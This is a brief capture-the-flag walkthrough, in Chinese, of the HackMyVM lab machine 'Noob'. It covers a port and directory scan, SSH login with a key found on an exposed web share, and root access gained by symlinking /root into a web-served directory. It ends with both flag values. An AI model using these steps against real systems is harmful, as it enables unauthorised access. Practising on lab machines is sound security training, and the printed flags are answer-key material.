# Bah

2024-11-22 https://hackmyvm.eu/machines/machine.php?vm=Noob

## IP

192.168.5.39

## Scan

```
PORT      STATE SERVICE
22/tcp    open  ssh
65530/tcp open  unknown
```

目录扫描：

```
gobuster dir -q -t 64 -e -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,txt -u http://192.168.5.39:65530/

http://192.168.5.39:65530/nt4share/
```

发现 ssh 登陆密钥，在 id_rsa.pub 中发现用户名 adela@noob 进行尝试 ssh 登陆，登陆成功。

进行枚举，什么都没发现，查看进程发现这个用户没有运行 65530 端口的服务，那么很有可能就是 root 用户运行的，这时在 adela 用户目录下，创建软链接指向 /root 目录，就可以再次通过网页进行访问，得到了 root 用户的 ssh 密钥：

```
ln -s /root root
```

这时直接访问到了 root 中的 user flag 和 root flag：

```
http://192.168.5.39:65530/nt4share/root/user.txt   HMVVCXUIUHFDSUIYREWDS432

http://192.168.5.39:65530/nt4share/root/root.txt   HMVA97DSA8732HJGDSA78623
```
